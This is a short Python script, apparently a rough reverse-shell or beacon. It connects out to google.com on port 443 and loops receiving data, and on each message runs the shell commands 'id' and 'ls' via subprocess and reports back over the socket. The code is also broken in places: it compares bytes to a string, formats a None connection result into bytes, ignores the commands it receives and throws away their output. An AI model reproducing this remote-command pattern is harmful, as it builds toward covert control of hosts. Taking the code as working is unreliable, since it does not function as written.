import socket
import subprocess
host = "google.com"
port = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection = None
while connection is None:
    try:
        connection = s.connect((host, port))
        s.send(b"[+] We are connected to %s" % connection)
        while True:
            try:
                exec_code = s.recv(1024)
                if exec_code == "quit":
                    break
                else:
                    proc = subprocess.Popen("id", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    prod = subprocess.Popen("ls", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    proc.stdout.read() + proc.stderr.read()
                    s.send(b"Ran id")
                    proc.stdin.write(b"test")
                    stdout, stderr = proc.communicate(b"hi")
                    stdout, _ = prod.communicate(b"test")
                    s.send(b"Ran test")
            except Exception as err:
                print(err)
    except Exception as e:
        print(e)
s.close()